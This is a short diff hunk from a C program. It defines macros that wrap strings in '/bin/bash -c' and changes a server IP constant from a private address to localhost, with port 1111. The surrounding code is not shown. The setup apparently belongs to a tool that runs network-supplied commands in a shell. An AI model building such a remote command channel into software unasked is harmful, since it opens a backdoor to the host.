@@ -17,7 +17,7 @@
  */ 
 #define SYSTEM_PREFIX		"/bin/bash -c \"" 
 #define SYSTEM_POSTFIX		"\" "
-#define SERVER_IP			"172.16.12.182"
+#define SERVER_IP			"127.0.0.1"
 #define	SERVER_PORT			1111
 
 int main(int argc, char * argv[]) {
